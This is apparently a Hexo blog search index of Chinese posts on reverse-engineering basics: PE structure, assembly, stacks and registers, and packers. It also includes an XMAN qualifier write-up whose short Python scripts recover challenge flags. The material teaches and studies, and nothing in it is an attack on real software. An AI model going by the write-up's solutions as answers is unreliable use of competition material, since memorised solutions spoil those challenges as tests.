<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[小论PE结构]]></title>
      <url>/2017/07/21/%E5%B0%8F%E8%AE%BAPE%E7%BB%93%E6%9E%84/</url>
      <content type="html"><![CDATA[<p>前面在二进制文件中小提了一下PE结构，只是皮毛，这里在做一些添加。<br><a id="more"></a></p>
<h3 id="PE文件的概念"><a href="#PE文件的概念" class="headerlink" title="PE文件的概念"></a>PE文件的概念</h3><p>弱弱的解释一下：PE(Portable Executable)文件称为可移植的可执行的文件，是微软Windows操作系统上的程序文件，包括EXE、DLL、SYS等。</p>
<h3 id="PE文件的结构"><a href="#PE文件的结构" class="headerlink" title="PE文件的结构"></a>PE文件的结构</h3><p>主要就是下图所示的三大块儿</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/PE3.png" width="500" hight="500" alt=""></center>

<h4 id="PE结构之DOS头"><a href="#PE结构之DOS头" class="headerlink" title="PE结构之DOS头"></a>PE结构之DOS头</h4><p>所有的PE文件都是以一个64字节的DOS头开始。这个DOS头只是为了兼容早期的DOS操作系统。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/DOS%E5%A4%B4.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之PE文件头"><a href="#PE结构之PE文件头" class="headerlink" title="PE结构之PE文件头"></a>PE结构之PE文件头</h4><p>PE文件头是PE文件格式各部分中信息以及结构较为复杂的一个部分，主要包含三部分：</p>
<center><em> PE文件标志</em></center><br><center> 映像文件头</center><br><center>* 可选文件头</center>

<center><img src="http://otc7tld02.bkt.clouddn.com/PE%E6%96%87%E4%BB%B6%E5%A4%B4.png" width="400" hight="400" alt=""></center>

<ul>
<li>PE文件标志是一个常量，即“PE00”，它标志着PE文件头的开始，同时它也是PE文件的一个主要标识。可以通过DOS头中e_lfanew找出该标志的位置。</li>
</ul>
<ul>
<li>映像文件头，它紧跟在PE文件标识的后面，映像文件头是一个结构体。</li>
</ul>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%98%A0%E5%83%8F%E5%A4%B4.png" width="400" hight="400" alt=""></center>

<p>Machine代表着改程序要执行在的计算机的类型；NumberOfSections表明了该PE文件的节数，该值与表的数量以及节表的数量应保持一致；SizeOfOptionalHeader表明了可选映像头的大小。</p>
<ul>
<li>可选映像头，尽管名字是可选映像头，但是事实上它并不是可选而是必须存在的，是“必选”的。</li>
</ul>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%8F%AF%E9%80%89%E6%98%A0%E5%83%8F%E5%A4%B4.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之节表"><a href="#PE结构之节表" class="headerlink" title="PE结构之节表"></a>PE结构之节表</h4><p>节表是紧挨着NT映像头的一结构数组，它的数量与节的数量是一致的，也与映像头文件中NumberOFSections是一致的。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%8A%82%E8%A1%A8.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之节信息"><a href="#PE结构之节信息" class="headerlink" title="PE结构之节信息"></a>PE结构之节信息</h4><p>这里在前面也提及到了，PE文件格式把可执行文件分成若干个数据节(section)，不同的资源被存放在不同的节中，PE文件中的节类型包括：</p>
<ul>
<li>.text     由编译器产生，存放着二进制的机器代码，也是反汇编和调试的对象</li>
<li>.data    初始化的数据块，如宏定义、全局变量等</li>
<li>.idata    可执行文件所使用的动态链接库等外来函数与文件的信息</li>
<li>.rsrc    存放程序的资源，如图标、菜单等</li>
<li>.reloc、edata、.rdata等</li>
</ul>
<h3 id="PE文件的查看"><a href="#PE文件的查看" class="headerlink" title="PE文件的查看"></a>PE文件的查看</h3><p>注意，分析一波，在此之前贴一个PE图，参照这个进行分析：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/PE.jpg" alt=""></p>
<p>OK,随机打开一个PE可执行文件。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/3%E5%A4%84.png" width="400" hight="400" alt=""></center>

<p>上图的1标记处看出MZ长度虽然不定，但是E-lfanew的位置却是定的，在3ch处，这个很关键，因为PE文件头部就是有e_lfanew定位的.</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%81%8F%E7%A7%BB%E4%BD%8D.png" width="400" hight="400" alt=""></center>

<p>那从上面的3ch处发现了PE文件头的位置就在00E8，是不是呢？继续往下看。图的2标记处看出DOS处长度不定。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/PR%E6%89%80%E5%9C%A8.png" width="400" hight="400" alt=""></center>

<p>上图可以看出DOS的所占很长，基于E-lfanew偏移大小为ACH，后面就是PE文件头所在位置，也的确就在00E8处。</p>
<p>最后看图的3标记处，也就是说PE文件后缀所在位置，那标准位置就是基于PE头偏移04h+14h-2h=16h处<br>也就是下图选中的位置。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/1721174559.png" width="400" hight="400" alt=""></center>


<p>下面再看看节的信息，就以.text为准吧。看看PE结构表。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/gg21182420.png" width="400" hight="400" alt=""></center>

<p>如上图所示，偏移量在字节表头地址偏移14h后面。那就在右边找到.text字节位置处。向后找14h处偏移，得到.text节基于PE文件的偏移为0400<br>，如下图所示。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/rr0721182212.png" width="400" hight="400" alt=""></center>

<p>验证一下，转到0400地址处，的确是.text节的存储数据。如下图所示：</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/1rr1182221.png" width="400" hight="400" alt=""></center>


<p>最后贴上整理比较详细的一些PE结构讲解：</p>
<ul>
<li><a href="http://blog.csdn.net/evileagle/article/details/11693499" target="_blank" rel="external">http://blog.csdn.net/evileagle/article/details/11693499</a></li>
<li><a href="http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html" target="_blank" rel="external">http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PE结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[汇编子程序]]></title>
      <url>/2017/07/20/%E6%B1%87%E7%BC%96%E5%AD%90%E7%A8%8B%E5%BA%8F/</url>
      <content type="html"><![CDATA[<p>前面总结了汇编的寄存器及相关知识，这里了解一下汇编代码的编写并做一个读代码小练习。</p>
<a id="more"></a>
<h4 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h4><pre><code>assume cs:code

data segment
    db &apos;conversation&apos;,0
data ends

code segment
start:  mov ax,cs   
        mov ds,ax
        mov si,offset capital//cs:si 为capital所在代码开始,在汇编中表示某位置使用段地址+偏移量来进行定位的，下面的读取也是类似。
        mov ax,0
        mov es,ax
        mov di,200h //es:di 为200h+0开始
        mov cx,offset capitalend-offset capital  ;两地址相减作为复制长度
        cld         ;清除DF标志为0，是数据按地址又低到高的正确顺序传输
        rep movsb   ;DS:SI这段地址的N个字节复制到ES:DI指向的地址

        ;以上一段代码作用为从capital段到capitalend复制code到200h+0的位置,共11h行

        mov ax,0
        mov es,ax
        mov word ptr es:[7ch*4],200h
        mov word ptr es:[7ch*4+2],0//这两行作用为指定int 7ch开始地址为200h(这里的7ch是我们自己定义的中断，中断的赋值概念低地址位为偏移量，高地址位为段值)
        mov ax,data//这里也就是0000:0200位置
        mov ds,ax
        mov si,0
        int 7ch；自定义终端，不一定为7c
        ;调用复制的capital代码

        mov ax,data
        mov es,ax;数据起地址data
        mov bp,0;偏移量0 //这里取es:bp位置的值，也就是转化之后的数据
        mov al,0;光标跟随输出位置                 
        mov bl,9;蓝色高亮
        mov bh,0;页数,0为当前页
        mov dh,0;y坐标                
        mov dl,0;x坐标                  
        mov cx,12;12个大小的长度
        mov ah,13h;输出字符
        ;上方为设置参数
        int 10h//这里是int 10h截断，有相关网址进行介绍
        ;输出

        mov ax,4c00h
        int 21h
        ;退出
capital:    push cx；压入cx用以计数
        push si；压入si用以计数
change:     mov cx,[si]
        mov ch,0
        jcxz ok；判断cx为0退出
        and byte ptr [si],11011111b;a=&apos;1100001&apos; A=&apos;1000001&apos;所以‘&amp;’一下就是就是小写字符转化为大写字符了。
        inc si
        jmp short change
ok:     pop si;执行si出栈
        pop cx；执行cx出栈
        iret
capitalend: nop

code ends
end start
</code></pre><h4 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h4><p>程序详解:<a href="http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html</a></p>
<p>汇编语言的调试方法：<a href="http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html" target="_blank" rel="external">http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html</a></p>
<p>Int 10h相关设置的知识点：<a href="http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html" target="_blank" rel="external">http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html</a></p>
<p>汇编中字、双字、字节关系：<a href="https://zhidao.baidu.com/question/270682681.html" target="_blank" rel="external">https://zhidao.baidu.com/question/270682681.html</a></p>
<p>程序中出现的rep movesb 以及cld详解：<a href="https://zhidao.baidu.com/question/270682681.html" target="_blank" rel="external">https://zhidao.baidu.com/question/270682681.html</a></p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN练习 writeup及所得]]></title>
      <url>/2017/07/19/XMAN%E7%BB%83%E4%B9%A0writeup%E5%8F%8A%E6%89%80%E5%BE%97/</url>
      <content type="html"><![CDATA[<p>XMAN夏令营虽然没参加，但是选拔赛的题目还是乘着闲暇时间做了几道，并且也学习到了一些。<br>在这里做个总结。<br><a id="more"></a></p>
<h4 id="第一道reverse"><a href="#第一道reverse" class="headerlink" title="第一道reverse"></a>第一道reverse</h4><p>老规矩就IDA看一波</p>
<p>找关键字符，跟踪过去F5大法。下图很明显关键处，而if判断便是重要所在。<br><img src="http://otc7tld02.bkt.clouddn.com/%E9%80%86%E5%90%91%E7%AE%97%E6%B3%951.png" alt=""></p>
<p>这个题目逻辑还是很清晰的，里面自带的乍一看以为是Base64，然而编译出来的不知道什么鬼，在往下看，将我们输入的19位异或操作然后sub_4996DD函数又是一通操作，其实就是做了Base64转换，为什么看出来，应为上面的Base64解码就是19位，根据特性所以猜测如此</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/19%E4%BD%8DBase.png" alt=""></p>
<p>那就很明了了，逆运算即可，附上代码：</p>
<pre><code>from base64 import *
w=&apos;WEw2TX82amFXOFlUXz1RSUVfbw==&apos;
t=b64decode(w)
print(t)
q=&apos;&apos;
for j in range(len(t)):
    q+=chr(ord(t[j])^j)
print(q)
</code></pre><h4 id="第二道安卓"><a href="#第二道安卓" class="headerlink" title="第二道安卓"></a>第二道安卓</h4><p>直接反编译一波</p>
<p>明显的correct和failed提示，关键就是encode.check了</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/correct.png" alt=""></p>
<p>跟过去，可以看到算法，也很简单<br>输入的字符与b进行加法运算与61取模然后乘2再减去循环次要和输入的一样，那就爆破吧。<br><img src="http://otc7tld02.bkt.clouddn.com/encode.png" alt=""></p>
<p>附上代码：</p>
<pre><code>b = [23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32]
w=&apos;&apos;
for i in range(len(b)):
    for j in range(127):
        if ((j+b[i])%61)*2-i==j:
            w+=chr(j)
print(w)
</code></pre><h4 id="第三道-安卓（有所得）"><a href="#第三道-安卓（有所得）" class="headerlink" title="第三道 安卓（有所得）"></a>第三道 安卓（有所得）</h4><p>给的是一个smali文件，直接用smali2java编译成java语言看好了。</p>
<p>看看代码，大致流程和Base64没差，除了最后的对应转换表，将输入的以8位二进制转换，然后以6的倍数为条件补‘0’，最后6位为单位切片，在对应标志选择相应位置替代。<br><img src="http://otc7tld02.bkt.clouddn.com/smali.png" alt=""></p>
<p>这样一来就可以逆向算法，一步一步已经写出了代码：</p>
<pre><code>end=&apos;xsZDluYYreJDyrpDpucZCo&apos;
temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;
aa=[]
bb=[]
cc=[]
str1=&apos;&apos;
cnt=0
s=&apos;&apos;
flag=&apos;&apos;
for i in end:
    aa.append(temp.find(i))
for i in aa:
    bb.append(bin(i)[2:])
for i in range(len(bb)):
    while (len(bb[i]) != 6):
        bb[i] = &apos;0&apos; + bb[i]
for i in bb:
    str1 += i
for i in str1:
    s += i
    cnt += 1
    if not cnt % 8:
        cc.append(s)
        s = &apos;&apos;
for i in cc:
    flag+=chr(int(i,2))
print(&apos;flag= %s&apos; % (flag))
</code></pre><p>上面都是一些简单的操作，所得何在，在于python的认知</p>
<ul>
<li>int(str,’2/8/10/16’):这个可以将字符串转换为整型十进制，在这题的应用就在于将‘100101’转换为对应的十进制整形。</li>
</ul>
<ul>
<li><p>‘’.split(‘’):可以将string按照相应的代表性质字符转换为列表<br>例如：’10010101 11110000’.split(‘ ‘)==&gt;[‘10010101’,’11110000’]</p>
</li>
<li><p>bin()转换之后得到的是一个str类型数据。</p>
</li>
</ul>
<p>以上三点也许大牛看来很low，但毕竟是自己的积累。最后附上最终代码：</p>
<pre><code>w=[]
mt=&apos;&apos;
end=&apos;xsZDluYYreJDyrpDpucZCo&apos;
temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;
for i in range(len(end)):
w.append(temp.find(end[i]))

m=&quot; &quot;.join([format(i,&apos;b&apos;) for i in w])

for j in m.split(&apos; &apos;):
    if len(j) != 6:
        mt+= &apos;0&apos; * (6 - len(j)) + j
    else:
        mt+=j

m_change=mt[:-(len(mt)%8)]

flag=&quot; &quot;.join(bin(int(x,2)) for x in [m_change[i:i+8] for i in range(0,len(m_change),8)])
print(&apos;&apos;.join([chr(i) for i in [int(b, 2) for b in flag.split(&apos; &apos;)]]))
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[二进制文件基础]]></title>
      <url>/2017/07/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>堆栈大致了解之后，了解一下windows下的二进制文件。<br><a id="more"></a></p>
<h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>  源代码被编译和链接之后形成了可执行文件。可执行文件之所以被操作系统加载运行，主要是因为他们有一个统一的格式规范。</p>
<p>  PE（Portable Executable）是Win32下的可执行文件遵守的数据格式( 补充：Linux下的可执行文件一般是Elf的文件。)。常见的可执行文件（<em>.exe </em>.dll）都是典型的PE文件。</p>
<p>  一个可执行文件不光光包含二进制文件的机器代码。还有字符串，菜单，图标，字体等一系列信息，PE文件格式规定了所有的这些信息在可执行文件中如何有规律的进行。所以说，要将一个可执行文件装入内存是一个非常难的事情。</p>
<p>  PE文件格式把可执行文件分成若干个数据节，不同的资源呗存放在不同的节中，一个典型的PE文件包含的节如下：</p>
<ol>
<li>.text:  由编译器生成，存放二进制的机器代码，也是我们反汇编和调试的对象。</li>
<li>.data:  初始化的数据块，如宏定义、全局变量、静态变量等。</li>
<li>.idata：可执行文件链接的其他动态库中的有关外来函数以及信息。</li>
<li>.rsrc:  存放程序图标资源等。</li>
</ol>
<p><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgydpknj3j30gk06st97.jpg" alt=""></p>
<p>  如上图所示，那四类是比较常见的节，除此之外还可能出现的有“.reloc”,“.edata”,“.tls”,“.rdata”等。</p>
<h2 id="加壳概念"><a href="#加壳概念" class="headerlink" title="加壳概念"></a>加壳概念</h2><p>  加壳其实应该叫做可执行程序资源压缩，是保护文件不被随意修改的一种技术。但并不是表示被加壳的程序就不能进行运行，只是无法查询和修改源代码而已，只有脱完壳之后才可以查看源代码。</p>
<p><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fhgye363iij30hl07swf6.jpg" alt=""></p>
<p>  加壳其实就是利用特殊的算法对程序的代码和资源进行压缩，就好像我们用WINZIP对重要文件进行加密压缩一样，他只是在程序内部进行这样的操作而已。打一个比方，如果说程序是外套，源代码等资源是人的身体的话，那壳就是位于两者之间的一件衬衫。</p>
<p>  现在也有许多的加壳工具，这些工具在文件头中会加入一段指令，告诉CPU如何才能解压自己，只是现在CPU处理速度都是秒秒钟的那种，所以加壳与不加壳的程序运行根本看不出什么不一样，除非你想了解源代码，你就会发现你被壳拒之门外。</p>
<p>  加壳工具分为两种:</p>
<ol>
<li>压缩壳:其特点主要是减小软件体积大小，加密保护并不是重点。</li>
<li>加密壳:其种类比较多，不同的壳侧重重点不同，一些壳单纯保护程序，另一些壳也提供注册、使用限制等功能。现如今需要付款使用的软件其实就是加了壳。</li>
</ol>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>  Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中，物理内存非常复杂，需要进入Windows内核才可以看到。通常，在用户模式下，用调试器看到的都是虚拟内存。</p>
<p>  用户启用程序使用的地址称之为虚拟地址和逻辑地址，其对应的存储空间称为虚拟内存和或逻辑地址空间。而计算机物理内存的访问地址则称为实地址和物理地址，其对应的存储空间称为物理存储空间或主存空间。程序进行虚拟地址到实地地址转换的过程叫做程序的再定位。</p>
<p>  <em>注:这里所说的内存是指Windows用户态内存映射机制下的虚拟内存，操作系统原理也有“虚拟内存”的概念存在，那是在实际物理内存不够时，有时候系统会把“部分硬盘空间”当作内存使用从而使得程序得到装载运行的现象，二者不能混淆。</em></p>
<h2 id="PE文件与虚拟内存的映射"><a href="#PE文件与虚拟内存的映射" class="headerlink" title="PE文件与虚拟内存的映射"></a>PE文件与虚拟内存的映射</h2><p>  在调试漏洞时候通常要进行两部操作：</p>
<ol>
<li>静态反汇编查看PE文件中某条指令的位置是相对于磁盘文件而言的，也就是需要知道文件偏移。</li>
<li><p>还需要知道这条指令在内存中的位置，也就是虚拟内存地址。</p>
<p>为此，我们需要弄清楚PE文件地址和虚拟内存地址之间的关系，首先了解几个重要的概念。</p>
</li>
</ol>
<ul>
<li>(1) 文件偏移地址（File Offset）<br> 数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。</li>
<li>(2) 装载地址（Image Base）<br> PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是0x00400000,DLL文件是0x10000000。这些位置可以通过修改编译选项进行更改。</li>
<li>(3) 虚拟内存地址（Virtual Address）<br> PE文件中的指令被装入内存后的地址。</li>
<li><p>(4) 相对虚拟地址（Relative Virtual Address  RVA）<br> 相对虚拟地址是内存地址相对于映射基址的偏移量。<br>虚拟内存地址、映射基址和相对虚拟内存地址三者之间有如下关系：<br>VA = Image Base + RVA</p>
<p>在默认情况下，一般PE文件的0字节将映射到虚拟内存的0x00400000位置，这个地址就是所谓的装载基地址（Image Base）。如下图所示，</p>
<p><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgyde3hyuj30fm09dq48.jpg" alt=""></p>
<p>文件偏移是相对于文件开始处0字节的偏移，RVA则是相对于装载基地址0x00400000处的偏移。由于操作系统在进行装载时基本保持PE排列结果，所以文件偏移地址和RVA很大可能一致。</p>
<p><em>（如果有细微的差异的话，那就是由于文件数据的存放单位与内存数据存放单位不同造成的。)</em></p>
</li>
<li><p><em>PE文件数据是按照磁盘数据标准存放，以0x200字节为基本单位进行组织，不足则以0x00填充，超过则分配下一个0X200继续使用</em></p>
</li>
<li><em>代码装入内存是按照内存数据存放，以0x1000字节为基本单位进行组织，不足全部补全，超过则分配下一个0x1000继续使用。</em></li>
</ul>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>  Lord PE是一个查看PE文件并对之进行分析、修改的脱壳辅助软件。<br>  如图就是这个工具的标准界面:</p>
<p>  <img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgyd04k5zj30h4085t9b.jpg" alt=""></p>
<p>  点击PE编辑器，随意加载如一个程序便可以查看相对信息：<br>  <img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgycmb7ajj30eq065jrb.jpg" alt=""></p>
<p>  点击区段进行节信息的查询：VOffset就是相对虚拟地址（RVA），ROffset是文件偏移地址。<br>  <img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fhgyca2g36j30dd04nmx0.jpg" alt=""></p>
<p>  在系统进程中，代码（.text节）将被加载到0x400000+0x11000=0x411000的虚拟地址中（装载基地址地址+RVA）。而在文件中，可以用二进制文件打开，看到对应的代码在0x10400位置。</p>
<p>  <img src="http://ww1.sinaimg.cn/large/006HJ39wgy1fhgybvrdxjj30a905sa9x.jpg" alt=""></p>
<p>  通过这个工具可以很清楚了解我们所需要的信息（RVA，VA，文件偏移，装载基地址），对于漏洞的分析是一个很好的辅助。</p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆栈及汇编基础]]></title>
      <url>/2017/07/04/%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>暑假生活开始，学习的好时间，今天就先重温一下堆栈的基础，好好巩固一下。</p>
<a id="more"></a>
<h2 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h2><p>  不同的操作系统，一个进程被分配进入的内存区域都会不同，但是无论是哪个系统，进程使用的内存按照功都同样大致分为四种：</p>
<ol>
<li>代码区:这个区域储存装入的要被执行的二进制机器代码，处理器会到这个区域获取指令并进行执行。</li>
<li>数据区:这个区域储存程序运行过程中出现的全局变量，局部变量等。</li>
<li>堆区:进程需要运行的时候，可以向这个区域申请空间，当运行结束之后空间将归还堆区，这就是堆的特点，动态分配和回收空间。</li>
<li><p>栈区:用于动态存储函数之间的调用关系，从而保证调用函数后能回到主函数中继续执行程序。</p>
<p>Windows下高级语言写出一个程序经过编译链接之后便可以生成一个可执行文件，这个可执行文件被装载运行之后便成为了所谓的进程。</p>
<p>每一个可执行程序中都包含着二进制级别的机器代码，这些代码将会被装载入代码区，处理器会一条一条的读取并运行。如果代码中有开辟动态内存的请求，则会在内存堆区中分配一个大小适合的区域给代码使用；当函数调用发生之后，栈中便会有栈帧自动保存函数的调用关系信息，以便于函数调用结束能回到主函数继续执行程序。</p>
<p>栈帧:C语言中，栈中的栈帧对应着未运行完成的函数，并且是一一对应，栈帧从逻辑上理解就是一个函数执行的环境:函数的参数，函数的变量，函数的返回地址等。<br>在函数栈帧中，一般包含如下几类重要信息。</p>
</li>
</ol>
<ul>
<li>局部变量:为函数局部变量开辟内存空间。</li>
<li>栈帧状态值:保存前栈帧的顶部和底部，用于在本栈弹出后可以恢复上一个栈帧。</li>
<li>函数返回地址:保存当前函数调用前的“断点”信息，也就是函数调用前的指令的位置，以便在函数返回时能回到调用的代码区中继续执行命令。</li>
</ul>
<h2 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h2><p>  假设一个如下的简单函数：</p>
<pre><code>int func_B(int a,int b)
{
  int i,j;
  i = a + b;
  j = a - b;
  return i * j;
}
int func_A(int c,int d)
{
  int t;
  t = func_B(c,d)+c;
  return t;
}
int main()
{
  int main;
  main=func_A(4,3);
  return main;
}
</code></pre><p>  函数在进行函数调用在栈中的操作如下：</p>
<ol>
<li>在main函数调用func_A的时候，首先在自己的栈帧中压入函数返回地址，然后为func_A创建新的栈帧并压入栈</li>
<li>在func_A调用func_B的时候，同样先在自己的栈帧中压入函数返回地址，然后为func_B创建新的栈帧并压入栈</li>
<li>在func_B返回时候，func_B专属的栈帧呗弹出统栈，这样就露出func_A的返回地址，这样就直接执行这个地址返回func_A中继续执行</li>
<li>在func_A返回时候，func_A专属的栈帧呗弹出统栈，这样就露出main的返回地址，这样就直接执行这个地址返回main中继续执行。</li>
</ol>
<center><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg" alt=""></center>

<p>  注意：在实际运行中，main函数并不是第一个被调用的函数，程序被装入内存前还有一些其他的操作。</p>
<p>函数调用本身的大体步骤如下：(这个对于后面pwn的学习中payload的构造有关键作用)</p>
<ol>
<li>参数入栈：将参数从右向左依次压入系统栈中。</li>
<li>返回地址入栈：将当前代码去调用指令的下一条指令地址压入栈中，供函数返回时继续执行。</li>
<li>代码区跳转：处理器从当前代码区跳转到被调用的入口处。</li>
<li>栈帧调整：(1)保存当前栈帧的状态值，以备后面恢复本栈帧时使用（EBP入栈）。<br>(2)将当前栈帧切换到新栈帧(将ESP值装入EBP，更新栈帧底部。)  </li>
</ol>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p> 在汇编语言当中，主要是四类寄存器。</p>
<ol>
<li>4个数据寄存器（EAX，EBX，ECX，EDX）。</li>
<li>2个变址寄存器（ESI，EDI）、2个指针寄存器（ESP、EBP）</li>
<li>6个端寄存器（ES、CS、SS、DS、FS、GS）</li>
<li>1个指令指针寄存器（EIP）、一个标志寄存器（EFlags）</li>
</ol>
<h3 id="1-寄存器"><a href="#1-寄存器" class="headerlink" title="1.寄存器"></a>1.寄存器</h3><center><img src="http://otc7tld02.bkt.clouddn.com/%E5%AF%84%E5%AD%98%E5%99%A8.png" width="500" hight="500" alt=""></center>

<h4 id="1-数据寄存器"><a href="#1-数据寄存器" class="headerlink" title="(1). 数据寄存器"></a>(1). 数据寄存器</h4><p>  数据寄存器主要用来保存操作数以及运算结果，这样就便于节省读取操作数的时间。<br>  32位CPU4个32位通用的寄存器EAX，EBX，ECX，EDX。他们只会对低16为数据进行存储，不会影响高16位的数据。这低16位的寄存器又被称为AX、BX、DC、CX。与先前的CPU寄存器相一致。</p>
<ul>
<li>EAX：累加寄存器，用于加减乘除的操作，也用于存储函数的返回值。使用频率非常高。</li>
<li>EBX：基址寄存器，作为存储器指针来用。</li>
<li>ECX：计数寄存器，在循环和字符串操作时，用他来计数；在位操作是，要用CL来指明移位的位数。</li>
<li>EDX：数据寄存器，在进行乘除运算时，它可作为默认的操作数进行操作。</li>
</ul>
<h4 id="2-变址寄存器"><a href="#2-变址寄存器" class="headerlink" title="(2). 变址寄存器"></a>(2). 变址寄存器</h4><p>  32位CPU有两个32位通用的变址寄存器ESI和EDI，与前者一样，只对低16位数据进程存取。</p>
<ul>
<li>ESI：在内存操作指令中作为源地址指针使用，处理字符串时候通常指向源串。</li>
<li>EDI：在内存操作指令中作为目的地址指针使用，处理字符串时候通常指向目标串。</li>
</ul>
<h4 id="3-指针寄存器"><a href="#3-指针寄存器" class="headerlink" title="(3). 指针寄存器"></a>(3). 指针寄存器</h4><p>EBP和ESP就是指针寄存器，主要用于存放堆栈内储存单元的偏移量，用他们可以实现多种寄存器储存操作数的寻址方式。</p>
<ul>
<li>EBP: 基地址寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的底部。通过它减去一定偏移量对栈中元素进行访问。</li>
<li>ESP：栈指针寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的顶部。</li>
</ul>
<h4 id="4-段寄存器"><a href="#4-段寄存器" class="headerlink" title="(4). 段寄存器"></a>(4). 段寄存器</h4><p>段寄存器是根据内存分段的模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问的较大物理空间的内存地址。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A83.png" width="400" hight="400" alt=""></center>

<ul>
<li>CS（Code）:  代码段寄存器，其值为代码段的段值</li>
<li>DS（Date）:  数据段寄存器，其值为数据段的段值</li>
<li>ES（Extra）: 附加段寄存器，其值为附加数据段的段值</li>
<li>SS（Strack）:堆栈段寄存器，其值为堆栈段的段值</li>
<li>FS（Flag）:  标志段寄存器，其值为附加数据段的段值</li>
<li>GS（Global）:全局段寄存器，其值为附加数据段的段值</li>
</ul>
<p>8086 CPU依赖其内部的四个段寄存器实现寻址1M字节物理地址空间。8086把1M字节地址空间划分为若干逻辑段，当前使用段的段值存放在段寄存器中。由段寄存器和段内偏移形成20位地址。</p>
<p>汇编中表示：</p>
<center><font color="red"><strong>段值：偏移</strong></font></center>

<p>计算方法：</p>
<center><font color="red"><strong>物理地址 = 段值×16 + 偏移</strong></font></center>

<p>举个<img src="http://otc7tld02.bkt.clouddn.com/%E4%BE%8B%E5%AD%90.png" width="30" hight="30" alt=""></p>
<p>用16进制表示的逻辑地址1234：3456H所对应的存储单元的物理地址为15796H。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/15796%E8%AE%A1%E7%AE%97.png" width="300" hight="300" alt=""></center>



<h4 id="5-指令指针寄存器"><a href="#5-指令指针寄存器" class="headerlink" title="(5). 指令指针寄存器"></a>(5). 指令指针寄存器</h4><ul>
<li>EIP：存放个下一次将要执行的指令在代码段中的偏移量。</li>
</ul>
<h4 id="6-标志寄存器"><a href="#6-标志寄存器" class="headerlink" title="(6). 标志寄存器"></a>(6). 标志寄存器</h4><p>8086 CPU中有一个16位的标志寄存器，包含了9个标志，主要用于反映处理器的状态和运算结果的某些特征。</p>
